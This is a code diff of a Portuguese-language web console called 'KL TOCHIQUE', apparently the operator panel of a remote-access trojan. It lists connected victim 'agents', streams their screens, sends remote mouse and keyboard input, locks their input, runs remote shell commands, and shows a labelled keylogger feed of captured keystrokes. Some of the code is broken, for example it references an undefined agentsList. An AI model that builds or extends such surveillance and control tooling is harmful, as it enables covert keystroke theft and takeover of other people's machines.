@@ -2,9 +2,8 @@
 <html lang="pt-BR">
 <head>
 <meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
-<title>KL TOCHIQUE - CONSOLE</title>
+<title>KL TOCHIQUE</title>
 <style>
-/* CSS INTEGRAL */
 @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap');
 :root{--bg:#050807;--panel:rgba(9,15,12,.88);--panel-2:rgba(12,22,17,.78);--line:rgba(84,255,160,.15);--line-strong:rgba(84,255,160,.28);--green:#54ffa0;--green-2:#2ee67c;--text:#e7fff0;--muted:#7f9a89;--danger:#ff4d6d;--warn:#ffcf5a;--shadow:0 20px 80px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.02);}
 body,html{height:100%;margin:0;padding:0;}
@@ -52,9 +51,7 @@ canvas{display:block;max-width:100%;height:auto;outline:none;}
             <span id="connStatus" class="status"></span>
         </div>
     </div>
-
     <div id="agents"></div>
-
     <div class="viewer">
         <h2 id="viewTitle">Tela ao vivo</h2>
         <div class="toolbar row">
@@ -67,20 +64,16 @@ canvas{display:block;max-width:100%;height:auto;outline:none;}
             <button id="applyProfile">Aplicar perfil</button>
             <button id="fullBtn">Tela cheia</button>
         </div>
-
         <div id="controlBanner" class="control-banner">🔴 Controle remoto ativo</div>
-
         <div class="screen-wrap" id="screenWrap">
             <canvas id="screen" tabindex="0"></canvas>
         </div>
-
         <div class="metrics">
             <span id="fps">FPS: 0</span>
             <span id="bitrate">Recebimento: 0 Mbps</span>
             <span id="frames">Frames: 0</span>
             <span id="drops">Drops: 0</span>
         </div>
-
         <div id="advancedControls" class="advanced-section" style="display:none;">
             <h3 style="font-family:'IBM Plex Mono';">Controle de Sistema</h3>
             <div class="row">
@@ -97,7 +90,6 @@ canvas{display:block;max-width:100%;height:auto;outline:none;}
                 <div id="shellOutput" class="terminal-box">Aguardando comando...</div>
             </div>
         </div>
-
         <div class="keylog-container" id="keylogContainer">
             <h3 style="margin-top:0; font-family:'IBM Plex Mono';">Console de Eventos (Keylogger)</h3>
             <div id="keylogList"></div>
@@ -106,34 +98,23 @@ canvas{display:block;max-width:100%;height:auto;outline:none;}
 </div>
 
 <script>
-// --- VARIÁVEIS ---
 const wsUrlEl=document.getElementById('wsUrl'),tokenEl=document.getElementById('token'),connectBtn=document.getElementById('connectBtn'),connStatus=document.getElementById('connStatus'),agentsEl=document.getElementById('agents'),canvas=document.getElementById('screen'),ctx=canvas.getContext('2d',{alpha:false}),fpsEl=document.getElementById('fps'),bitrateEl=document.getElementById('bitrate'),framesEl=document.getElementById('frames'),dropsEl=document.getElementById('drops'),profileEl=document.getElementById('profile'),applyProfile=document.getElementById('applyProfile'),controlBanner=document.getElementById('controlBanner'),screenWrap=document.getElementById('screenWrap'),keylogList=document.getElementById('keylogList'),advancedControls=document.getElementById('advancedControls'),btnLockInput=document.getElementById('btnLockInput'),btnUnlockInput=document.getElementById('btnUnlockInput'),lockStatusText=document.getElementById('lockStatus'),shellCommandInput=document.getElementById('shellCommand'),btnExecuteShell=document.getElementById('btnExecuteShell'),shellOutput=document.getElementById('shellOutput');
 
 let ws=null,agents=[],selectedAgentId=null,frames=0,fpsFrames=0,lastFps=performance.now(),bytesSecond=0,dropped=0,decoding=false,pendingFrame=null;
 
-// --- CONEXÃO ---
 function connect() {
     const url = wsUrlEl.value.trim(), token = tokenEl.value;
     localStorage.setItem('em_ws', url); localStorage.setItem('em_admin', token);
     if(!url) return alert("URL necessária!");
-    
     try { ws = new WebSocket(url); ws.binaryType = 'arraybuffer'; } 
     catch(e) { alert("Erro ao abrir WebSocket"); return; }
-
-    ws.onopen = () => {
-        setStatus('Conectado', 'ok');
-        send({ type: 'admin_hello', token: token });
-    };
-
+    ws.onopen = () => { setStatus('Conectado', 'ok'); send({ type: 'admin_hello', token: token }); };
     ws.onmessage = async (ev) => {
         if (typeof ev.data === 'string') {
             let m; try { m = JSON.parse(ev.data); } catch { return; }
             handleMessage(m);
-        } else {
-            renderFrame(ev.data);
-        }
+        } else { renderFrame(ev.data); }
     };
-
     ws.onclose = () => setStatus('Desconectado', 'bad');
     ws.onerror = () => setStatus('Erro de Conexão', 'bad');
 }
@@ -151,7 +132,6 @@ function handleMessage(m) {
     }
 }
 
-// --- VÍDEO ---
 function renderFrame(buf) {
     if (decoding) { pendingFrame = buf; dropped++; return; }
     decoding = true;
@@ -177,6 +157,23 @@ function updateMetrics(m) {
     document.getElementById('drops').textContent = m.drops || 0;
 }
 
+function updateLockUI(status) {
+    btnLockInput.style.display = status ? 'none' : 'inline-block';
+    btnUnlockInput.style.display = status ? 'inline-block' : 'none';
+    lockStatusText.textContent = status ? 'Status: BLOQUEADO' : 'Status: Desbloqueado';
+}
+
+// --- CONTINUAÇÃO DA FUNÇÃO addKeylogEntry ---
+function addKeylogEntry(key, down, ts) {
+    const entry = document.createElement('div');
+    entry.className = 'log-entry';
+    const statusClass = down ? 'log-down' : 'log-up';
+    const statusText = down ? 'PRESSIONADA' : 'SOLTA';
+    entry.innerHTML = `<span class="log-time">[${ts}]</span> <span class="log-key">${key}</span> <span class="${statusClass}">${statusText}</span>`;
+    keylogList.prepend(entry);
+    if (keylogList.childNodes.length > 50) keylogList.lastChild.remove();
+}
+
 // --- CONTROLE REMOTO (MOUSE E TECLADO) ---
 function selectAgent(id) {
     selectedAgentId = id;
@@ -185,4 +182,87 @@ function selectAgent(id) {
     send({ type: 'request_control', agentId: id });
 }
 
-function send
+function sendControl(data) {
+    if (selectedAgentId) send({ type: 'control_input', agentId: selectedAgentId, ...data });
+}
+
+// Mouse
+canvas.addEventListener('mousedown', (e) => handleMouseEvent(e, true));
+canvas.addEventListener('mouseup', (e) => handleMouseEvent(e, false));
+canvas.addEventListener('mousemove', (e) => {
+    if (e.buttons > 0) handleMouseEvent(e, true, true);
+});
+
+function handleMouseEvent(e, isDown, isMove = false) {
+    if (!selectedAgentId) return;
+    const rect = canvas.getBoundingClientRect();
+    const x = (e.clientX - rect.left) / rect.width;
+    const y = (e.clientY - rect.top) / rect.height;
+
+    if (isMove) {
+        sendControl({ kind: 'move', x, y });
+    } else {
+        let button = e.button === 2 ? 'right' : (e.button === 1 ? 'middle' : 'left');
+        sendControl({ kind: 'mouse', button, down: isDown, x, y });
+    }
+}
+
+// Teclado
+canvas.addEventListener('keydown', (e) => {
+    if (['F5', 'Tab'].includes(e.code)) e.preventDefault();
+    sendControl({ kind: 'key', code: e.code, down: true });
+});
+
+canvas.addEventListener('keyup', (e) => {
+    sendControl({ kind: 'key', code: e.code, down: false });
+});
+
+canvas.addEventListener('contextmenu', e => e.preventDefault());
+
+// --- UI E AGENTES ---
+function renderAgents(agents) {
+    agentsEl.innerHTML = '';
+    agents.forEach(agent => {
+        const div = document.createElement('div');
+        div.className = 'card';
+        div.innerHTML = `
+            <div class="agent-title">${agent.name}</div>
+            <div class="small">${agent.user}</div>
+            <div class="small" style="margin-top:5px; color:var(--green)">${agent.id}</div>
+            <div style="margin-top:10px;">
+                <button onclick="selectAgent('${agent.id}')">Conectar e Controlar</button>
+            </div>
+        `;
+        agentsList.appendChild(div);
+    });
+}
+
+// Bloqueio de Input
+document.getElementById('btnLockInput').onclick = () => sendControl({ type: 'input_lock', active: true });
+document.getElementById('btnUnlockInput').onclick = () => sendControl({ type: 'input_lock', active: false });
+
+// Shell
+document.getElementById('btnExecuteShell').onclick = () => {
+    const cmd = shellCommandInput.value.trim();
+    if (cmd && selectedAgentId) {
+        shellOutput.textContent += `\n> ${cmd}\n`;
+        send({ type: 'shell_cmd', agentId: selectedAgentId, cmd: cmd });
+        shellCommandInput.value = '';
+    }
+};
+
+// Inicialização
+connectBtn.addEventListener('click', connect);
+applyProfile.onclick = () => {
+    const p = profileEl.value;
+    localStorage.setItem('em_profile', p);
+    send({ type: 'set_profile', agentId: selectedAgentId, profile: p });
+};
+document.getElementById('fullBtn').onclick = () => canvas.requestFullscreen?.();
+
+// --- FINALIZAÇÃO ---
+
+// --- FIM DO SCRIPT ---
+</script>
+</body>
+</html>
